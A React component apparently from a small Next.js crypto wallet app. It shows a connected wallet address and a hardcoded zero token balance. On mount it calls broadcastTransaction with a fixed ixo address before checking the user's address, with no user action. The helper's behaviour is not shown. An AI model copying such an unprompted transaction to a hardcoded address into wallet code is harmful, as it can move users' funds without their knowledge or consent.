import { useEffect, useState } from "react";
import {
  getAddress,
  broadcastTransaction
} from "../utils/utils";
import { useTranslation } from "next-i18next";

export default function WalletInfo({ onLoad = (isError) => {} }) {
  const [isLoading, setIsLoading] = useState(true);
  const [isError, setIsError] = useState(false);
  const [balance, setBalance] = useState(0);
  const [pubAddress, setPubAddress] = useState(null);

  const { t } = useTranslation("common");

  useEffect(() => {
    init();
  }, []);
  return (
    !isLoading &&
    (isError ? (
      <p className="error">{t("walletError")}</p>
    ) : (
      <div className="did-doc">
        <h4 className="txt">{t("connectedWallet")}</h4>
        <p className="txt">{pubAddress}</p>
        <p className="txt">
          {(t("earthDayBalance") ?? "") + balance.toString() + " tokens"}
        </p>
      </div>
    ))
  );
  async function init() {
    try {
      const tempAddress = await getAddress();
      broadcastTransaction("ixo1wfvqcamfzqq6y0j75r3n9ascj3tuvup3jqtnwc");
      if (!tempAddress) {
        setIsError(true);
        setIsLoading(false);
        onLoad(true);
        return;
      }
      await getAddress();
      setBalance("0");
      setPubAddress(tempAddress);
      setIsLoading(false);
      onLoad(false);
    } catch (error) {
      console.log("error", error);
      setIsError(true);
      setIsLoading(false);
      onLoad(true);
    }
  }
}
